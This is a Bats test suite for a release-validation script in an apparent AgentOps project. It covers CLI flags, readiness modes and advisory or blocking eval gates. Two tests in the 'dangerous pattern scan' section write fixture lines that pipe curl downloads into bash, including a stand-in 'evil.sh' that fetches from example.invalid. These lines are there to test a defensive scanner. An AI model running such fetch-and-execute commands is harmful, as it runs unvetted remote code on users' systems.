#!/usr/bin/env bats
# ci-local-release.bats — Tests for scripts/ci-local-release.sh
#
# Strategy: exercise the script's CLI flag parsing, validation, and fast-path
# behavior. Heavy gates are excluded via --fast and further neutralized by
# stubbing the scripts/tests they invoke.

setup() {
    REPO_ROOT="$(cd "$BATS_TEST_DIRNAME/../.." && pwd)"
    SCRIPT="$REPO_ROOT/scripts/ci-local-release.sh"
    TMP_DIR="$(mktemp -d)"
}

teardown() {
    rm -rf "$TMP_DIR"
}

@test "ci-local-release.sh exists and is executable" {
    [ -f "$SCRIPT" ]
    [ -x "$SCRIPT" ]
}

@test "ci-local-release.sh has set -euo pipefail" {
    run grep -q 'set -euo pipefail' "$SCRIPT"
    [ "$status" -eq 0 ]
}

@test "--help prints usage and exits 0" {
    run bash "$SCRIPT" --help
    [ "$status" -eq 0 ]
    [[ "$output" == *"Usage"* ]]
    [[ "$output" == *"--fast"* ]]
    [[ "$output" == *"--security-mode"* ]]
    [[ "$output" == *"--readiness-mode"* ]]
    [[ "$output" == *"--hil-target"* ]]
    [[ "$output" == *"AGENTOPS_RELEASE_ALLOW_AGENT_MUTATIONS"* ]]
    [[ "$output" == *"LOCAL_CI_STRICT_LOCAL_ENV"* ]]
}

@test "-h prints usage and exits 0" {
    run bash "$SCRIPT" -h
    [ "$status" -eq 0 ]
    [[ "$output" == *"Usage"* ]]
}

@test "--help documents the --quick sanity mode" {
    run bash "$SCRIPT" --help
    [ "$status" -eq 0 ]
    [[ "$output" == *"--quick"* ]]
    [[ "$output" == *"--sanity"* ]]
}

@test "--quick is an accepted flag (help-exit path)" {
    run bash "$SCRIPT" --quick --help
    [ "$status" -eq 0 ]
    [[ "$output" == *"Usage"* ]]
}

@test "--sanity is an accepted alias (help-exit path)" {
    run bash "$SCRIPT" --sanity --help
    [ "$status" -eq 0 ]
    [[ "$output" == *"Usage"* ]]
}

@test "script defines a QUICK_MODE default of false" {
    run grep -q 'QUICK_MODE=false' "$SCRIPT"
    [ "$status" -eq 0 ]
}

@test "--quick skips the release-rehearsal lane (SBOM/cross-build/scan)" {
    # Guard the core contract: --quick must not invoke the slow rehearsal steps.
    run grep -q 'if \[\[ "\$QUICK_MODE" == "true" \]\]; then' "$SCRIPT"
    [ "$status" -eq 0 ]
    run grep -q 'run_go_quick_build_and_test' "$SCRIPT"
    [ "$status" -eq 0 ]
    # The quick lane must announce that it is skipping the rehearsal lane.
    run grep -q 'skipping release-rehearsal lane' "$SCRIPT"
    [ "$status" -eq 0 ]
}

@test "--quick treats local-env checks as advisory not gating" {
    # Worktree-disposition + MemRL feedback are local-machine state, not committed code.
    run grep -q 'run_step_advisory "Worktree disposition gate"' "$SCRIPT"
    [ "$status" -eq 0 ]
    run grep -q 'run_step_advisory "MemRL feedback loop health"' "$SCRIPT"
    [ "$status" -eq 0 ]
    # The advisory helper must not bump the error count.
    run grep -qE '^run_step_advisory\(\) \{' "$SCRIPT"
    [ "$status" -eq 0 ]
}

@test "local-env checks block only for official or strict local-ci" {
    run env SCRIPT_UNDER_TEST="$SCRIPT" bash -c '
        set -euo pipefail
        set --
        export AGENTOPS_CI_LOCAL_RELEASE_SOURCE_ONLY=1
        source "$SCRIPT_UNDER_TEST"

        RELEASE_READINESS_MODE=advisory
        LOCAL_CI_STRICT_LOCAL_ENV=0
        if local_env_checks_blocking; then
            exit 1
        fi

        RELEASE_READINESS_MODE=official
        LOCAL_CI_STRICT_LOCAL_ENV=0
        local_env_checks_blocking

        RELEASE_READINESS_MODE=advisory
        LOCAL_CI_STRICT_LOCAL_ENV=1
        local_env_checks_blocking
    '

    [ "$status" -eq 0 ]
}

@test "unknown flag is rejected with usage and exit 1" {
    run bash "$SCRIPT" --not-a-real-flag
    [ "$status" -eq 1 ]
    [[ "$output" == *"Unknown option"* ]]
}

@test "--security-mode rejects invalid values" {
    run bash "$SCRIPT" --security-mode garbage
    [ "$status" -eq 1 ]
    [[ "$output" == *"Invalid --security-mode"* ]]
}

@test "--security-mode accepts quick (help-exit path)" {
    # The script validates --security-mode before --help short-circuit when given.
    # So we pass --help last to force an early successful exit without running gates.
    run bash "$SCRIPT" --security-mode quick --help
    [ "$status" -eq 0 ]
}

@test "--security-mode accepts full (help-exit path)" {
    run bash "$SCRIPT" --security-mode full --help
    [ "$status" -eq 0 ]
}

@test "--release-version rejects garbage values" {
    run bash "$SCRIPT" --release-version not-a-version
    [ "$status" -eq 1 ]
    [[ "$output" == *"Invalid --release-version"* ]]
}

@test "--release-version accepts semver (help-exit path)" {
    run bash "$SCRIPT" --release-version 2.18.0 --help
    [ "$status" -eq 0 ]
}

@test "--release-version accepts semver with leading v (help-exit path)" {
    run bash "$SCRIPT" --release-version v2.18.0 --help
    [ "$status" -eq 0 ]
}

@test "--release-version accepts prerelease suffixes (help-exit path)" {
    run bash "$SCRIPT" --release-version 2.18.0-rc.1 --help
    [ "$status" -eq 0 ]
}

@test "--jobs accepts numeric value (help-exit path)" {
    run bash "$SCRIPT" --jobs 4 --help
    [ "$status" -eq 0 ]
}

@test "--readiness-mode rejects invalid values" {
    run bash "$SCRIPT" --readiness-mode garbage
    [ "$status" -eq 1 ]
    [[ "$output" == *"Invalid --readiness-mode"* ]]
}

@test "--readiness-mode accepts official (help-exit path)" {
    run bash "$SCRIPT" --readiness-mode official --help
    [ "$status" -eq 0 ]
}

@test "script references ARTIFACT_DIR for release-grade artifact tracking" {
    # Verifies the RUN_ID / ARTIFACT_DIR pattern is present, since release
    # provenance depends on artifacts being written to a dated directory.
    run grep -q 'ARTIFACT_DIR=' "$SCRIPT"
    [ "$status" -eq 0 ]
    run grep -q 'version="$(release_version)"' "$SCRIPT"
    [ "$status" -eq 0 ]
    run grep -q 'make build VERSION="$version"' "$SCRIPT"
    [ "$status" -eq 0 ]
}

@test "script logs local-ci mutation lane and escape hatch" {
    run grep -q 'LOCAL_CI_MUTATION_LANE="local-ci-release"' "$SCRIPT"
    [ "$status" -eq 0 ]
    run grep -q 'LOCAL_CI_MUTATION_ESCAPE_HATCH="operator-run-release-validation"' "$SCRIPT"
    [ "$status" -eq 0 ]
    run grep -q 'Release metadata guard:' "$SCRIPT"
    [ "$status" -eq 0 ]
}

@test "script invokes release smoke without mutation opt-in by default" {
    run grep -q 'Release smoke test (all commands)" ./scripts/release-smoke-test.sh --skip-build' "$SCRIPT"
    [ "$status" -eq 0 ]
    run grep -q -- '--allow-agent-mutations' "$SCRIPT"
    [ "$status" -eq 1 ]
}

@test "dangerous pattern scan allows first-party installer one-liners" {
    mkdir -p "$TMP_DIR/scripts"
    cat > "$TMP_DIR/scripts/install-claude.sh" <<'EOF'
curl -fsSL https://raw.githubusercontent.com/boshu2/agentops/main/scripts/install-claude.sh | bash
EOF
    cat > "$TMP_DIR/scripts/install-agy.sh" <<'EOF'
curl -fsSL https://raw.githubusercontent.com/boshu2/agentops/main/scripts/install-agy.sh | bash -s -- --ref v3.1.0
EOF

    run env SCRIPT_UNDER_TEST="$SCRIPT" FIXTURE_DIR="$TMP_DIR" bash -c '
        set -euo pipefail
        set --
        export AGENTOPS_CI_LOCAL_RELEASE_SOURCE_ONLY=1
        source "$SCRIPT_UNDER_TEST"
        cd "$FIXTURE_DIR"
        run_dangerous_pattern_scan
    '

    [ "$status" -eq 0 ]
}

@test "dangerous pattern scan rejects non-allowlisted curl bash" {
    mkdir -p "$TMP_DIR/scripts"
    cat > "$TMP_DIR/scripts/evil.sh" <<'EOF'
curl -fsSL https://example.invalid/install.sh | bash
EOF

    run env SCRIPT_UNDER_TEST="$SCRIPT" FIXTURE_DIR="$TMP_DIR" bash -c '
        set -euo pipefail
        set --
        export AGENTOPS_CI_LOCAL_RELEASE_SOURCE_ONLY=1
        source "$SCRIPT_UNDER_TEST"
        cd "$FIXTURE_DIR"
        run_dangerous_pattern_scan
    '

    [ "$status" -eq 1 ]
    [[ "$output" == *"Found dangerous pattern"* ]]
}

@test "script wires HIL and release readiness gates" {
    run grep -q 'check-release-hil.sh' "$SCRIPT"
    [ "$status" -eq 0 ]
    run grep -q 'check-release-readiness.sh' "$SCRIPT"
    [ "$status" -eq 0 ]
}

@test "script wires eval and digital twin evidence into release artifacts" {
    run grep -q 'run_step "Digital twin/VIL evidence" write_release_digital_twin_evidence' "$SCRIPT"
    [ "$status" -eq 0 ]
    run grep -q 'run_step "AgentOps eval evidence" run_release_eval_evidence' "$SCRIPT"
    [ "$status" -eq 0 ]
    run grep -q 'eval_fast_report:' "$SCRIPT"
    [ "$status" -eq 0 ]
    run grep -q 'digital_twin_evidence:' "$SCRIPT"
    [ "$status" -eq 0 ]
}

@test "eval evidence is advisory outside official release mode" {
    mkdir -p "$TMP_DIR/scripts" "$TMP_DIR/cli/bin"
    cat > "$TMP_DIR/scripts/eval-agentops.sh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
run_root=""
advisory=false
while [[ $# -gt 0 ]]; do
    case "$1" in
        --run-root)
            run_root="$2"
            shift 2
            ;;
        --advisory)
            advisory=true
            shift
            ;;
        *)
            shift
            ;;
    esac
done
mkdir -p "$run_root/stubrun"
printf '{"suite_count":1,"baseline_count":0,"policy_mismatch_count":0,"stale_suite_hashes":[]}\n' > "$run_root/stubrun/baseline-audit.json"
echo "FAIL eval-agentops: simulated broad corpus failure"
if [[ "$advisory" == "true" ]]; then
    exit 0
fi
exit 1
EOF
    chmod +x "$TMP_DIR/scripts/eval-agentops.sh"

    run env SCRIPT_UNDER_TEST="$SCRIPT" FIXTURE_DIR="$TMP_DIR" MODE_UNDER_TEST=advisory bash -c '
        set -euo pipefail
        set --
        export AGENTOPS_CI_LOCAL_RELEASE_SOURCE_ONLY=1
        source "$SCRIPT_UNDER_TEST"
        REPO_ROOT="$FIXTURE_DIR"
        RUN_ID="stubrun"
        ARTIFACT_DIR="$FIXTURE_DIR/artifacts"
        mkdir -p "$ARTIFACT_DIR"
        release_readiness_mode() { printf "%s\n" "$MODE_UNDER_TEST"; }
        cd "$FIXTURE_DIR"
        run_release_eval_evidence
    '

    [ "$status" -eq 0 ]
    jq -e '.status == "fail" and (.command | contains("--advisory")) and .exit_code == 0' "$TMP_DIR/artifacts/eval-agentops-fast.json"
}

@test "eval evidence stays blocking in official release mode" {
    mkdir -p "$TMP_DIR/scripts" "$TMP_DIR/cli/bin"
    cat > "$TMP_DIR/scripts/eval-agentops.sh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
run_root=""
while [[ $# -gt 0 ]]; do
    case "$1" in
        --run-root)
            run_root="$2"
            shift 2
            ;;
        *)
            shift
            ;;
    esac
done
mkdir -p "$run_root/stubrun"
printf '{"suite_count":1,"baseline_count":0,"policy_mismatch_count":0,"stale_suite_hashes":[]}\n' > "$run_root/stubrun/baseline-audit.json"
echo "FAIL eval-agentops: simulated official failure"
exit 1
EOF
    chmod +x "$TMP_DIR/scripts/eval-agentops.sh"

    run env SCRIPT_UNDER_TEST="$SCRIPT" FIXTURE_DIR="$TMP_DIR" MODE_UNDER_TEST=official bash -c '
        set -euo pipefail
        set --
        export AGENTOPS_CI_LOCAL_RELEASE_SOURCE_ONLY=1
        source "$SCRIPT_UNDER_TEST"
        REPO_ROOT="$FIXTURE_DIR"
        RUN_ID="stubrun"
        ARTIFACT_DIR="$FIXTURE_DIR/artifacts"
        mkdir -p "$ARTIFACT_DIR"
        release_readiness_mode() { printf "%s\n" "$MODE_UNDER_TEST"; }
        cd "$FIXTURE_DIR"
        run_release_eval_evidence
    '

    [ "$status" -eq 1 ]
    jq -e '.status == "fail" and (.command | contains("--advisory") | not) and .exit_code == 1' "$TMP_DIR/artifacts/eval-agentops-fast.json"
}

@test "script defines pass/fail/warn helpers consistent with pre-push-gate" {
    run grep -qE '^pass\(\) \{' "$SCRIPT"
    [ "$status" -eq 0 ]
    run grep -qE '^fail\(\) \{' "$SCRIPT"
    [ "$status" -eq 0 ]
    run grep -qE '^warn\(\) \{' "$SCRIPT"
    [ "$status" -eq 0 ]
}

@test "script starts errors counter at 0" {
    run grep -q '^errors=0' "$SCRIPT"
    [ "$status" -eq 0 ]
}

@test "script defines a FAST_MODE default of false" {
    run grep -q 'FAST_MODE=false' "$SCRIPT"
    [ "$status" -eq 0 ]
}

@test "script increments error count from fail helper" {
    # Guard the convention: fail() must bump errors so the gate can aggregate.
    run grep -q 'errors=\$((errors + 1))' "$SCRIPT"
    [ "$status" -eq 0 ]
}
